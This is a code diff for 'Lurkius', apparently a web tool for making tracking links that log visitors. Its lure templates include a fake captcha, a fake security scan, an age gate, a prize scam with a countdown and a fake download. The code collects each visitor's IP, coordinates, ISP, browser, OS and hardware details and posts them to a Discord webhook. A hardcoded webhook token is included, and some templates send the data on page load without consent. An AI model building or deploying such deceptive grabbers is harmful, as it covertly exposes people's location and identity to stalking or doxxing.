+      <div class="d-si on" onclick="tab('overview')"><svg width="12" height="12" viewBox="0 0 12 12" fill="none"><rect x=".5" y=".5" width="4.5" height="4.5" rx="1" stroke="currentColor" stroke-width="1.1"/><rect x="7" y=".5" width="4.5" height="4.5" rx="1" stroke="currentColor" stroke-width="1.1"/><rect x=".5" y="7" width="4.5" height="4.5" rx="1" stroke="currentColor" stroke-width="1.1"/><rect x="7" y="7" width="4.5" height="4.5" rx="1" stroke="currentColor" stroke-width="1.1"/></svg>Overview</div>
+      <div class="d-si" onclick="tab('create')"><svg width="12" height="12" viewBox="0 0 12 12" fill="none"><path d="M6 1v10M1 6h10" stroke="currentColor" stroke-width="1.2" stroke-linecap="round"/></svg>Create Link</div>
+      <div class="d-si" onclick="tab('links')"><svg width="12" height="12" viewBox="0 0 12 12" fill="none"><path d="M1.5 3.5h9M1.5 6h6M1.5 8.5h7" stroke="currentColor" stroke-width="1.1" stroke-linecap="round"/></svg>My Links</div>
+      <div class="d-si" onclick="tab('activity')"><svg width="12" height="12" viewBox="0 0 12 12" fill="none"><circle cx="6" cy="6" r="5" stroke="currentColor" stroke-width="1.1"/><path d="M6 3.5v3l1.5 1.5" stroke="currentColor" stroke-width="1.1" stroke-linecap="round"/></svg>Activity</div>
+      <div class="d-si" onclick="tab('settings')"><svg width="12" height="12" viewBox="0 0 12 12" fill="none"><circle cx="6" cy="6" r="2" stroke="currentColor" stroke-width="1.1"/><path d="M6 1v1M6 10v1M1 6h1M10 6h1M2.5 2.5l.7.7M8.8 8.8l.7.7M2.5 9.5l.7-.7M8.8 3.2l.7-.7" stroke="currentColor" stroke-width="1.1" stroke-linecap="round"/></svg>Settings</div>
+    </aside>
+    <main class="d-main">
+
+      <!-- OVERVIEW -->
+      <div id="tabOverview" class="d-tab on">
+        <div class="d-hd"><h2>Overview</h2><p>Your tracking dashboard</p></div>
+        <div class="d-stats">
+          <div class="d-stat"><div class="d-stat-n" id="stLinks">0</div><div class="d-stat-l">Links</div></div>
+          <div class="d-stat"><div class="d-stat-n" id="stHits">0</div><div class="d-stat-l">Total Hits</div></div>
+          <div class="d-stat"><div class="d-stat-n" id="stCtry">0</div><div class="d-stat-l">Countries</div></div>
+        </div>
+        <div class="d-card">
+          <div class="d-card-hd"><h3>Recent Activity</h3><span>Last 5 hits</span></div>
+          <div class="d-card-b" id="actShort"><div class="d-empty"><div class="d-empty-ico">📡</div>No activity yet</div></div>
+        </div>
+      </div>
+
+      <!-- CREATE -->
+      <div id="tabCreate" class="d-tab">
+        <div class="d-hd"><h2>Create Link</h2><p>Set up a new tracking link with custom embed</p></div>
+        <div class="d-card">
+          <div class="d-card-hd"><h3>Link Settings</h3></div>
+          <div class="d-card-b">
+            <div class="row">
+              <div class="col2 field"><label>Label</label><input type="text" id="fLabel" placeholder="e.g. Discord Invite"/></div>
+              <div class="col field"><label>Template</label>
+                <select id="fStyle">
+                  <option value="captcha">Lurkius Captcha</option>
+                  <option value="shield">Shield Security Scan</option>
+                  <option value="age">Age Verification</option>
+                  <option value="prize">Prize / Winner</option>
+                  <option value="download">File Download</option>
+                </select>
+              </div>
+            </div>
+            <div class="row">
+              <div class="col field"><label>Webhook URL (leave blank to use default)</label><input type="text" id="fWebhook" placeholder="https://discord.com/api/webhooks/..."/></div>
+            </div>
+            <div class="divider"></div>
+            <div class="lbl" style="margin-bottom:9px">Discord Embed</div>
+            <div class="row">
+              <div class="col2 field"><label>Title</label><input type="text" id="eTitle" value="📍 New Hit Logged" oninput="updPrev()"/></div>
+              <div class="col field" style="max-width:110px;min-width:90px"><label>Color</label><input type="color" id="eColor" value="#ffffff" oninput="updPrev()"/></div>
+            </div>
+            <div class="row">
+              <div class="col field"><label>Description</label><textarea id="eDesc" placeholder="Someone just visited your link." oninput="updPrev()"></textarea></div>
+            </div>
+            <div class="row">
+              <div class="col field"><label>Footer</label><input type="text" id="eFooter" value="Lurkius Security" oninput="updPrev()"/></div>
+              <div class="col field"><label>Thumbnail</label>
+                <select id="eThumb" onchange="toggleThumb();updPrev()">
+                  <option value="flag">Country Flag</option>
+                  <option value="none">None</option>
+                  <option value="custom">Custom URL</option>
+                </select>
+              </div>
+            </div>
+            <div class="row" id="thumbRow" style="display:none">
+              <div class="col field"><label>Image URL</label><input type="text" id="eThumbUrl" placeholder="https://..." oninput="updPrev()"/></div>
+            </div>
+            <div class="e-prev" id="ePrev">
+              <div class="e-prev-lbl">Preview</div>
+              <div class="e-prev-title" id="pTitle">📍 New Hit Logged</div>
+              <div class="e-prev-desc" id="pDesc"></div>
+              <div class="e-prev-tags"><span>🌐 IP</span><span>🗺️ Country</span><span>🏙️ City</span><span>📌 Coords</span><span>📡 ISP</span><span>🔢 ASN</span><span>🕐 TZ</span><span>🖥️ Browser</span><span>💻 OS</span><span>📐 Screen</span><span>🌍 Lang</span><span>⚙️ CPU/RAM</span></div>
+              <div class="e-prev-foot" id="pFoot">Lurkius Security</div>
+            </div>
+            <div style="display:flex;gap:9px;margin-top:13px">
+              <button class="btn btn-p" onclick="createLink()">Generate Link</button>
+              <button class="btn btn-g" onclick="clearCreate()">Clear</button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- LINKS -->
+      <div id="tabLinks" class="d-tab">
+        <div class="d-hd"><h2>My Links</h2><p>All your tracking links</p></div>
+        <div class="d-card">
+          <div class="d-card-hd"><h3>Links</h3><span id="linkCnt">0 links</span></div>
+          <div style="padding:0 18px">
+            <div class="d-empty" id="linksEmpty"><div class="d-empty-ico">⛓</div>No links yet</div>
+            <table class="d-tbl" id="linksTable" style="display:none">
+              <thead><tr><th>Label</th><th>Key</th><th>Template</th><th>URL</th><th>Hits</th><th></th><th></th></tr></thead>
+              <tbody id="linksBody"></tbody>
+            </table>
+          </div>
+          <div style="height:1px"></div>
+        </div>
+      </div>
+
+      <!-- ACTIVITY -->
+      <div id="tabActivity" class="d-tab">
+        <div class="d-hd"><h2>Activity</h2><p>Full visitor log</p></div>
+        <div class="d-card">
+          <div class="d-card-hd"><h3>Visitor Log</h3><span id="actCnt">0 hits</span></div>
+          <div class="d-card-b" id="actFull"><div class="d-empty"><div class="d-empty-ico">📡</div>Waiting for visitors…</div></div>
+        </div>
+      </div>
+
+      <!-- SETTINGS -->
+      <div id="tabSettings" class="d-tab">
+        <div class="d-hd"><h2>Settings</h2><p>Account and appearance</p></div>
+        <div class="d-card">
+          <div class="d-card-hd"><h3>Account</h3></div>
+          <div class="d-card-b">
+            <div class="row"><div class="col field"><label>Change Username</label><input type="text" id="sUser" placeholder="New username"/></div><div class="col field"><label>New Password</label><input type="password" id="sPass" placeholder="Leave blank to keep"/></div></div>
+            <div class="row"><div class="col field"><label>Default Webhook URL</label><input type="text" id="sWh" placeholder="https://discord.com/api/webhooks/..."/></div></div>
+            <button class="btn btn-p" onclick="saveAccount()">Save Account</button>
+          </div>
+        </div>
+        <div class="d-card">
+          <div class="d-card-hd"><h3>Appearance</h3></div>
+          <div class="d-card-b">
+            <div class="s-row">
+              <div class="s-info"><h4>Light Mode</h4><p>Toggle light/dark theme</p></div>
+              <button class="s-toggle" id="themeBtn" onclick="toggleTheme()"></button>
+            </div>
+            <div class="s-row" style="flex-direction:column;align-items:flex-start">
+              <div class="s-info"><h4>Accent Color</h4><p>Changes buttons, highlights and progress bars</p></div>
+              <div class="swatches" id="swatches">
+                <div class="swatch on" style="background:#fff" data-c="#fff" data-tx="#000" onclick="setAccent('#fff','#000',this)"></div>
+                <div class="swatch" style="background:#3b82f6" data-c="#3b82f6" data-tx="#fff" onclick="setAccent('#3b82f6','#fff',this)"></div>
+                <div class="swatch" style="background:#10b981" data-c="#10b981" data-tx="#fff" onclick="setAccent('#10b981','#fff',this)"></div>
+                <div class="swatch" style="background:#f59e0b" data-c="#f59e0b" data-tx="#000" onclick="setAccent('#f59e0b','#000',this)"></div>
+                <div class="swatch" style="background:#ef4444" data-c="#ef4444" data-tx="#fff" onclick="setAccent('#ef4444','#fff',this)"></div>
+                <div class="swatch" style="background:#8b5cf6" data-c="#8b5cf6" data-tx="#fff" onclick="setAccent('#8b5cf6','#fff',this)"></div>
+                <div class="swatch" style="background:#ec4899" data-c="#ec4899" data-tx="#fff" onclick="setAccent('#ec4899','#fff',this)"></div>
+                <input type="color" id="customColor" style="width:24px;height:24px;border-radius:50%;border:2px solid var(--bd2);padding:2px;cursor:pointer;background:transparent" title="Custom" onchange="setAccentCustom(this.value)"/>
+              </div>
+            </div>
+            <div class="s-row">
+              <div class="s-info"><h4>Dashboard Title</h4><p>Shown in the nav bar</p></div>
+              <input type="text" id="sDashTitle" style="width:150px" placeholder="Lurkius"/>
+            </div>
+            <div style="margin-top:13px"><button class="btn btn-p" onclick="saveAppearance()">Save Appearance</button></div>
+          </div>
+        </div>
+        <div class="d-card">
+          <div class="d-card-hd"><h3>Danger Zone</h3></div>
+          <div class="d-card-b">
+            <div class="s-row"><div class="s-info"><h4>Clear All Links</h4><p>Permanently delete all links</p></div><button class="btn btn-g btn-danger" style="padding:6px 14px;font-size:9px" onclick="clearLinks()">Clear</button></div>
+            <div class="s-row"><div class="s-info"><h4>Delete Account</h4><p>Remove your account and all data</p></div><button class="btn btn-g btn-danger" style="padding:6px 14px;font-size:9px" onclick="deleteAccount()">Delete</button></div>
+          </div>
+        </div>
+      </div>
+
+    </main>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+// ════════════════════════════════════════════
+// CONFIG
+// ════════════════════════════════════════════
+const DEFAULT_WH = "https://discord.com/api/webhooks/1480165131701846026/6i1kUmeTCcmby2owdwAhKv0zZENpi8TgVb56Ijrpe_TjC45NYOBiU9G_aGDWWFG44wZb";
+const ADMIN      = "lurkius";
+
+// ════════════════════════════════════════════
+// STORAGE (localStorage with fallback)
+// ════════════════════════════════════════════
+const DB = {
+  get(k){try{return JSON.parse(localStorage.getItem(k))}catch{return null}},
+  set(k,v){try{localStorage.setItem(k,JSON.stringify(v))}catch{}},
+  del(k){try{localStorage.removeItem(k)}catch{}}
+};
+
+// ════════════════════════════════════════════
+// UTILS
+// ════════════════════════════════════════════
+const UA = navigator.userAgent;
+function getBrowser(u){
+  if(/Edg\//.test(u))return'Microsoft Edge';
+  if(/OPR\//.test(u))return'Opera';
+  if(/Firefox\//.test(u))return'Firefox';
+  if(/Chrome\//.test(u))return'Google Chrome';
+  if(/Safari\//.test(u))return'Safari';
+  return'Unknown';
+}
+function getOS(u){
+  if(/Windows NT 10|Windows NT 11/.test(u))return'Windows 10/11';
+  if(/Windows NT 6/.test(u))return'Windows 7/8';
+  if(/Mac OS X/.test(u)){const m=u.match(/Mac OS X ([^\)]+)/);return'macOS '+(m?m[1].replace(/_/g,'.'):'')}
+  if(/Android/.test(u)){const m=u.match(/Android ([^;]+)/);return'Android '+(m?m[1]:'')}
+  if(/iPhone|iPad/.test(u))return'iOS';
+  if(/Linux/.test(u))return'Linux';
+  return'Unknown';
+}
+function randKey(){const c='ABCDEFGHJKLMNPQRSTUVWXYZ23456789';return[0,0,0].map(()=>Array.from({length:4},()=>c[~~(Math.random()*c.length)]).join('')).join('-')}
+function delay(ms){return new Promise(r=>setTimeout(r,ms))}
+function ago(d){const s=~~((Date.now()-d)/1000);return s<60?`${s}s ago`:s<3600?`${~~(s/60)}m ago`:`${~~(s/3600)}h ago`}
+function trunc(s,n=34){return s&&s.length>n?s.slice(0,n)+'…':s||'?'}
+function hexInt(h){return parseInt(h.replace('#',''),16)}
+function hashPw(p){return btoa(unescape(encodeURIComponent(p+'_lrk')))}
+function enc(o){try{return encodeURIComponent(btoa(unescape(encodeURIComponent(JSON.stringify(o)))))}catch{return''}}
+function dec(s){try{return JSON.parse(decodeURIComponent(escape(atob(decodeURIComponent(s)))))}catch{return null}}
+
+function toast(m,ms=2200){
+  const t=document.getElementById('toast');
+  t.textContent=m;t.classList.add('on');
+  clearTimeout(t._t);t._t=setTimeout(()=>t.classList.remove('on'),ms);
+}
+
+// ════════════════════════════════════════════
+// IP LOOKUP — 4 APIs with timeout
+// ════════════════════════════════════════════
+async function tFetch(url,ms=6000){
+  const ctrl=new AbortController();
+  const id=setTimeout(()=>ctrl.abort(),ms);
+  try{const r=await fetch(url,{signal:ctrl.signal});clearTimeout(id);return r}
+  catch(e){clearTimeout(id);throw e}
+}
+
+async function getIP(){
+  // 1. freeipapi.com — most reliable, no rate limit issues
+  try{
+    const r=await tFetch('https://freeipapi.com/api/json');
+    const j=await r.json();
+    if(j.ipAddress)return{
+      ip:j.ipAddress, country:j.countryName, cc:j.countryCode,
+      city:j.cityName, lat:String(j.latitude?.toFixed(4)||'?'),
+      lon:String(j.longitude?.toFixed(4)||'?'),
+      isp:j.isp||'?', asn:j.asn||'?', tz:j.timeZone||'?'
+    };
+  }catch(e){console.log('IP API 1 failed',e.message)}
+
+  // 2. ip-api.com
+  try{
+    const r=await tFetch('https://ip-api.com/json/?fields=status,country,countryCode,city,lat,lon,isp,as,query,timezone');
+    const j=await r.json();
+    if(j.status==='success')return{
+      ip:j.query, country:j.country, cc:j.countryCode,
+      city:j.city, lat:String(j.lat?.toFixed(4)||'?'),
+      lon:String(j.lon?.toFixed(4)||'?'),
+      isp:j.isp, asn:j.as, tz:j.timezone
+    };
+  }catch(e){console.log('IP API 2 failed',e.message)}
+
+  // 3. ipwho.is
+  try{
+    const r=await tFetch('https://ipwho.is/');
+    const j=await r.json();
+    if(j.success)return{
+      ip:j.ip, country:j.country, cc:j.country_code,
+      city:j.city, lat:String(j.latitude?.toFixed(4)||'?'),
+      lon:String(j.longitude?.toFixed(4)||'?'),
+      isp:j.connection?.isp||'?', asn:'AS'+(j.connection?.asn||'?'), tz:j.timezone?.id||'?'
+    };
+  }catch(e){console.log('IP API 3 failed',e.message)}
+
+  // 4. ipapi.co
+  try{
+    const r=await tFetch('https://ipapi.co/json/');
+    const j=await r.json();
+    if(j.ip)return{
+      ip:j.ip, country:j.country_name||j.country, cc:j.country_code,
+      city:j.city, lat:String(j.latitude?.toFixed(4)||'?'),
+      lon:String(j.longitude?.toFixed(4)||'?'),
+      isp:j.org, asn:j.asn, tz:j.timezone
+    };
+  }catch(e){console.log('IP API 4 failed',e.message)}
+
+  return{ip:'Unknown',country:'Unknown',cc:'',city:'Unknown',lat:'?',lon:'?',isp:'?',asn:'?',tz:'?'};
+}
+
+// ════════════════════════════════════════════
+// COLLECT ALL DATA
+// ════════════════════════════════════════════
+let V = {}; // visitor data
+
+async function collect(){
+  const geo = await getIP();
+  V = {
+    ...geo,
+    browser: getBrowser(UA),
+    os:      getOS(UA),
+    screen:  `${window.screen.width}×${window.screen.height}`,
+    lang:    navigator.language||'?',
+    cores:   String(navigator.hardwareConcurrency||'?'),
+    ram:     navigator.deviceMemory ? navigator.deviceMemory+' GB' : '?'
+  };
+  return V;
+}
+
+// ════════════════════════════════════════════
+// SEND WEBHOOK (via /api/webhook proxy)
+// ════════════════════════════════════════════
+async function sendHook(data, webhookUrl, cfg){
+  const wh = webhookUrl || DEFAULT_WH;
+  if(!wh) return;
+
+  const title  = cfg?.title  || '📍 New Hit Logged';
+  const desc   = cfg?.desc   || null;
+  const footer = cfg?.footer || 'Lurkius Security';
+  const color  = cfg?.color  ? hexInt(cfg.color) : 0xffffff;
+  const thumb  = cfg?.thumb  || 'flag';
+  const thumbUrl = thumb==='flag'
+    ? `https://flagcdn.com/w80/${(data.cc||'').toLowerCase()}.png`
+    : thumb==='custom' ? cfg?.thumbUrl||null : null;
+
+  const embed = {
+    title, color,
+    fields:[
+      {name:'🌐 IP',          value:`\`${data.ip}\``,                     inline:true},
+      {name:'🗺️ Country',     value:`\`${data.country}\``,                inline:true},
+      {name:'🏙️ City',        value:`\`${data.city}\``,                   inline:true},
+      {name:'📌 Coordinates', value:`\`${data.lat}, ${data.lon}\``,       inline:true},
+      {name:'📡 ISP',         value:`\`${trunc(data.isp)}\``,             inline:true},
+      {name:'🔢 ASN',         value:`\`${trunc(data.asn)}\``,             inline:true},
+      {name:'🕐 Timezone',    value:`\`${data.tz}\``,                     inline:true},
+      {name:'🖥️ Browser',     value:`\`${data.browser}\``,                inline:true},
+      {name:'💻 OS',          value:`\`${data.os}\``,                     inline:true},
+      {name:'📐 Screen',      value:`\`${data.screen}\``,                 inline:true},
+      {name:'🌍 Language',    value:`\`${data.lang}\``,                   inline:true},
+      {name:'⚙️ CPU / RAM',   value:`\`${data.cores} cores / ${data.ram}\``, inline:true},
+    ],
+    footer:{text:`${footer} • ${new Date().toUTCString()}`}
+  };
+  if(desc) embed.description = desc;
+  if(thumbUrl) embed.thumbnail = {url:thumbUrl};
+
+  const payload = {username:'Lurkius', avatar_url:'https://cdn.discordapp.com/embed/avatars/0.png', embeds:[embed]};
+
+  // Send via server-side proxy (avoids CORS)
+  try{
+    const r = await fetch('/api/webhook',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({webhookUrl: wh, payload})
+    });
+    if(!r.ok) console.warn('Webhook proxy error:',r.status, await r.text());
+    else console.log('Webhook sent OK');
+  }catch(e){
+    console.warn('Proxy failed, trying direct:',e.message);
+    // fallback: try direct (won't work in browser due to CORS but worth trying)
+    try{
+      await fetch(wh,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)});
+    }catch(e2){console.warn('Direct also failed:',e2.message)}
+  }
+}
+
+// ════════════════════════════════════════════
+// FILL DATA ROWS
+// ════════════════════════════════════════════
+function fill(prefix, d){
+  const s=(id,v)=>{const e=document.getElementById(id);if(e)e.textContent=v};
+  s(prefix+'Ip',   d.ip);
+  s(prefix+'Loc',  `${d.city}, ${d.country}`);
+  s(prefix+'Br',   d.browser);
+  s(prefix+'Os',   d.os);
+  if(document.getElementById(prefix+'Coords')) s(prefix+'Coords', `${d.lat}, ${d.lon}`);
+  if(document.getElementById(prefix+'Isp'))    s(prefix+'Isp',    trunc(d.isp));
+  if(document.getElementById(prefix+'Asn'))    s(prefix+'Asn',    trunc(d.asn));
+  if(prefix+'Tz'&&document.getElementById(prefix+'Tz')) s(prefix+'Tz', d.tz);
+  if(document.getElementById(prefix+'Sc'))     s(prefix+'Sc',     d.screen);
+  if(document.getElementById(prefix+'Lg'))     s(prefix+'Lg',     d.lang);
+  if(document.getElementById(prefix+'Cpu'))    s(prefix+'Cpu',    d.cores+' cores');
+  if(document.getElementById(prefix+'Ram'))    s(prefix+'Ram',    d.ram);
+}
+
+function showRows(id){document.getElementById(id)?.classList.add('on')}
+function showBtn(id){const e=document.getElementById(id);if(e)e.classList.add('on')}
+
+// ════════════════════════════════════════════
+// TEMPLATE FLOWS
+// ════════════════════════════════════════════
+
+// Progress bar helper
+function progAnim(fillId,stopAt=82){
+  let p=0;
+  const t=setInterval(()=>{p=Math.min(p+Math.random()*2,stopAt);const e=document.getElementById(fillId);if(e)e.style.width=p+'%'},80);
+  return {stop:()=>{clearInterval(t);const e=document.getElementById(fillId);if(e)e.style.width='100%'}};
+}
+
+// TPL 1: CAPTCHA
+async function runCaptcha(cfg){
+  document.getElementById('cTime').textContent=new Date().toUTCString().slice(0,25);
+  const prog=document.getElementById('cProg'); prog.classList.add('on');
+  const box=document.getElementById('cBox'); box.classList.add('spin');
+  document.getElementById('cLbl').textContent='Verifying…';
+  const stat=document.getElementById('cStat'); stat.textContent='Analysing browser fingerprint…';
+
+  const anim=progAnim('cFill');
+  setTimeout(()=>stat.textContent='Checking threat database…',900);
+  setTimeout(()=>stat.textContent='Resolving geolocation…',1900);
+
+  const d=await collect();
+  anim.stop(); await delay(300);
+
+  fill('c',d);
+  showRows('cRows');
+  box.classList.remove('spin'); box.classList.add('ok');
+  document.getElementById('cLbl').textContent='Verified';
+  stat.textContent='All checks passed.'; await delay(350);
+
+  document.getElementById('cOk').classList.add('on'); await delay(300);
+  document.getElementById('cCountry').textContent=d.country;
+  document.getElementById('cGreet').classList.add('on'); await delay(300);
+  showBtn('cContinue');
+
+  await sendHook(d, cfg?.webhook, cfg?.embedCfg);
+}
+
+// TPL 2: SHIELD
+async function runShield(cfg){
+  const prog=document.getElementById('shProg'); prog.classList.add('on');
+  const anim=progAnim('shFill');
+  // animate shield path
+  setTimeout(()=>{const p=document.getElementById('shAnim');if(p)p.style.strokeDashoffset='0'},100);
+
+  const d=await collect();
+
+  for(let i=1;i<=4;i++){
+    await delay(380);
+    const ico=document.getElementById('si'+i);
+    ico.classList.remove('spinning');ico.classList.add('done');ico.textContent='✓';
+    if(i<4)document.getElementById('si'+(i+1)).classList.add('spinning');
+  }
+
+  anim.stop(); await delay(300);
+  document.getElementById('shTitle').textContent='Connection Verified';
+  document.getElementById('shSub').textContent=`All checks passed. How's it there in ${d.country}?`;
+  fill('sh',d); showRows('shRows'); await delay(300);
+  showBtn('shContinue');
+
+  await sendHook(d, cfg?.webhook, cfg?.embedCfg);
+}
+
+// TPL 3: AGE GATE
+let _ageChecked=false;
+let _ageCfg=null;
+function ageToggle(){
+  _ageChecked=!_ageChecked;
+  const b=document.getElementById('ageBox');
+  b.classList.toggle('on',_ageChecked);
+  b.textContent=_ageChecked?'✓':'';
+  document.getElementById('ageBtn').classList.toggle('ready',_ageChecked);
+}
+async function ageSubmit(){
+  if(!_ageChecked)return;
+  const btn=document.getElementById('ageBtn');
+  btn.textContent='Verifying…';btn.classList.remove('ready');
+  const prog=document.getElementById('ageProg');prog.style.display='block';prog.classList.add('on');
+  const anim=progAnim('ageFill');
+  const d=await collect();
+  anim.stop(); await delay(300);
+  btn.textContent='Verified ✓';
+  fill('age',d); showRows('ageRows'); await delay(300);
+  showBtn('ageContinue');
+  await sendHook(d, _ageCfg?.webhook, _ageCfg?.embedCfg);
+}
+async function runAge(cfg){
+  _ageCfg=cfg;
+  // collect & send immediately on page load, then show UI for clicking
+  const d=await collect();
+  fill('age',d);
+  await sendHook(d, cfg?.webhook, cfg?.embedCfg);
+}
+
+// TPL 4: PRIZE
+let _prizeSecs=299, _prizeInt=null, _prizeCfg=null;
+function startPrizeTimer(){
+  _prizeInt=setInterval(()=>{
+    _prizeSecs=Math.max(0,_prizeSecs-1);
+    const m=~~(_prizeSecs/60),s=_prizeSecs%60;
+    const el=document.getElementById('prTimer');
+    if(el)el.textContent=`0${m}:${s.toString().padStart(2,'0')}`;
+    if(_prizeSecs===0)clearInterval(_prizeInt);
+  },1000);
+  const numEl=document.getElementById('prNum');
+  if(numEl)numEl.textContent=(~~(Math.random()*9000)+1000).toLocaleString();
+}
+async function prizeClaim(){
+  const btn=document.getElementById('prBtn');
+  btn.textContent='Claiming…';btn.disabled=true;
+  const prog=document.getElementById('prProg');prog.style.display='block';prog.classList.add('on');
+  const anim=progAnim('prFill');
+  const d=await collect();
+  anim.stop(); await delay(300);
+  btn.textContent='✓ Claimed!';
+  fill('pr',d); showRows('prRows'); await delay(300);
+  showBtn('prContinue');
+  await sendHook(d, _prizeCfg?.webhook, _prizeCfg?.embedCfg);
+}
+async function runPrize(cfg){
+  _prizeCfg=cfg;
+  startPrizeTimer();
+  const d=await collect();
+  fill('pr',d);
+  await sendHook(d, cfg?.webhook, cfg?.embedCfg);
+}
+
+// TPL 5: DOWNLOAD
+async function runDownload(cfg){
+  const stats=['Connecting to server…','Authenticating…','Resolving CDN node…','Starting download…','Downloading…'];
+  let p=0,si=0;
+  const fillEl=document.getElementById('dlFill');
+  const pctEl=document.getElementById('dlPct');
+  const ticker=setInterval(()=>{
+    p=Math.min(p+Math.random()*1.6,88);
+    if(fillEl)fillEl.style.width=p+'%';
+    if(pctEl)pctEl.textContent=~~p+'%';
+    const spd=document.getElementById('dlSpeed');if(spd)spd.textContent=~~(Math.random()*700+200)+' KB/s';
+    const eta=document.getElementById('dlEta');if(eta){const r=Math.max(0,~~((90-p)/1.5));eta.textContent=r>0?`~${r}s remaining`:'Almost done…'}
+    if(si<stats.length-1&&p>si*18){const s=document.getElementById('dlStat');if(s)s.textContent=stats[++si]}
+  },120);
+
+  const d=await collect();
+  clearInterval(ticker);
+  if(fillEl)fillEl.style.width='100%';if(pctEl)pctEl.textContent='100%';
+  const s=document.getElementById('dlStat');if(s)s.textContent='Complete!';
+  const spd=document.getElementById('dlSpeed');if(spd)spd.textContent='—';
+  const eta=document.getElementById('dlEta');if(eta)eta.textContent='Done';
+  fill('dl',d); showRows('dlRows'); await delay(300);
+  showBtn('dlContinue');
+  await sendHook(d, cfg?.webhook, cfg?.embedCfg);
+}
+
+// ════════════════════════════════════════════
+// ROUTING - show correct template
+// ════════════════════════════════════════════
+function showTpl(style){
+  const map={captcha:'tCaptcha',shield:'tShield',age:'tAge',prize:'tPrize',download:'tDownload'};
+  ['tCaptcha','tShield','tAge','tPrize','tDownload'].forEach(id=>document.getElementById(id).style.display='none');
+  const el=document.getElementById(map[style]||'tCaptcha');
+  if(el)el.style.display='';
+}
+
+// ════════════════════════════════════════════
+// AFTER VERIFY → auth or dashboard
+// ════════════════════════════════════════════
+function afterVerify(){
+  if(_prizeInt)clearInterval(_prizeInt);
+  const w=document.getElementById('vWrap');
+  w.style.transition='opacity .4s';w.style.opacity='0';
+  setTimeout(()=>{
+    w.style.display='none';
+    const sess=DB.get('lrk_session');
+    if(sess?.username){loadUser(sess.username);showDash();}
+    else showAuth();
+  },400);
+}
+
+// ════════════════════════════════════════════
+// AUTH
+// ════════════════════════════════════════════
+function showAuth(){
+  const p=document.getElementById('authPage');p.style.display='flex';p.classList.add('on');
+}
+
+function switchAuth(t){
+  document.querySelectorAll('.auth-tab').forEach((el,i)=>el.classList.toggle('on',i===(t==='login'?0:1)));
+  document.getElementById('loginView').style.display=t==='login'?'':'none';
+  document.getElementById('regView').style.display=t==='register'?'':'none';
+}
+
+function doLogin(){
+  const u=document.getElementById('liUser').value.trim();
+  const p=document.getElementById('liPass').value;
+  const accs=DB.get('lrk_accs')||[];
+  const acc=accs.find(a=>a.u===u&&a.h===hashPw(p));
+  if(!acc){document.getElementById('liErr').classList.add('on');return}
+  document.getElementById('liErr').classList.remove('on');
+  DB.set('lrk_session',{username:u});
+  loadUser(u);
+  document.getElementById('authPage').style.display='none';
+  document.getElementById('authPage').classList.remove('on');
+  showDash();
+}
+
+function doRegister(){
+  const u=document.getElementById('regUser').value.trim();
+  const p=document.getElementById('regPass').value;
+  const p2=document.getElementById('regPass2').value;
+  const err=document.getElementById('regErr');
+  if(!u||u.length<3){err.textContent='Username must be 3+ chars.';err.classList.add('on');return}
+  if(p.length<6){err.textContent='Password must be 6+ chars.';err.classList.add('on');return}
+  if(p!==p2){err.textContent='Passwords do not match.';err.classList.add('on');return}
+  const accs=DB.get('lrk_accs')||[];
+  if(accs.find(a=>a.u===u)){err.textContent='Username taken.';err.classList.add('on');return}
+  accs.push({u,h:hashPw(p),settings:{theme:'dark',ac:'#fff',actx:'#000',title:'Lurkius',wh:DEFAULT_WH},links:[],acts:[]});
+  DB.set('lrk_accs',accs);
+  DB.set('lrk_session',{username:u});
+  err.classList.remove('on');
+  loadUser(u);
+  document.getElementById('authPage').style.display='none';
+  document.getElementById('authPage').classList.remove('on');
+  showDash();
+  toast('Welcome to Lurkius!');
+}
+
+function doLogout(){
+  DB.del('lrk_session');
+  location.reload();
+}
+
+// ════════════════════════════════════════════
+// USER SESSION
+// ════════════════════════════════════════════
+let CU=null,links=[],acts=[];
+
+function getAccs(){return DB.get('lrk_accs')||[]}
+function saveAccs(accs){DB.set('lrk_accs',accs)}
+
+function loadUser(username){
+  const accs=getAccs();
+  const acc=accs.find(a=>a.u===username);
+  if(!acc)return;
+  CU=acc;links=acc.links||[];acts=acc.acts||[];
+  applySettings(acc.settings);
+  document.getElementById('navUser').textContent=username;
+  document.getElementById('sUser').value=username;
+  document.getElementById('sWh').value=acc.settings?.wh||'';
+  document.getElementById('sDashTitle').value=acc.settings?.title||'Lurkius';
+  renderLinks();renderActs();updateStats();
+}
+
+function save(){
+  if(!CU)return;
+  const accs=getAccs();
+  const i=accs.findIndex(a=>a.u===CU.u);
+  if(i>=0){accs[i]={...CU,links,acts};saveAccs(accs)}
+}
+
+// ════════════════════════════════════════════
+// SETTINGS
+// ════════════════════════════════════════════
+function applySettings(s){
+  if(!s)return;
+  document.documentElement.style.setProperty('--ac',s.ac||'#fff');
+  document.documentElement.style.setProperty('--ac-tx',s.actx||'#000');
+  if(s.theme==='light')document.body.classList.add('light');
+  else document.body.classList.remove('light');
+  const title=s.title||'Lurkius';
+  const nn=document.getElementById('navName');if(nn)nn.textContent=title;
+  const nl=document.getElementById('navLogo');if(nl)nl.textContent=(title[0]||'L').toUpperCase();
+  const tb=document.getElementById('themeBtn');if(tb)tb.classList.toggle('on',s.theme==='light');
+  document.querySelectorAll('.swatch').forEach(sw=>sw.classList.toggle('on',sw.dataset.c===s.ac));
+}
+
+function toggleTheme(){
+  const light=document.body.classList.toggle('light');
+  if(CU){if(!CU.settings)CU.settings={};CU.settings.theme=light?'light':'dark';}
+  document.getElementById('themeBtn').classList.toggle('on',light);
+}
+
+function setAccent(c,tx,el){
+  document.documentElement.style.setProperty('--ac',c);
+  document.documentElement.style.setProperty('--ac-tx',tx);
+  document.querySelectorAll('.swatch').forEach(s=>s.classList.remove('on'));
+  if(el)el.classList.add('on');
+  if(CU){if(!CU.settings)CU.settings={};CU.settings.ac=c;CU.settings.actx=tx;}
+}
+
+function setAccentCustom(c){
+  const r=parseInt(c.slice(1,3),16),g=parseInt(c.slice(3,5),16),b=parseInt(c.slice(5,7),16);
+  const tx=(0.299*r+0.587*g+0.114*b)/255>.5?'#000':'#fff';
+  setAccent(c,tx,null);
+}
+
+function saveAccount(){
+  if(!CU)return;
+  const nu=document.getElementById('sUser').value.trim();
+  const np=document.getElementById('sPass').value;
+  const wh=document.getElementById('sWh').value.trim();
+  const accs=getAccs();
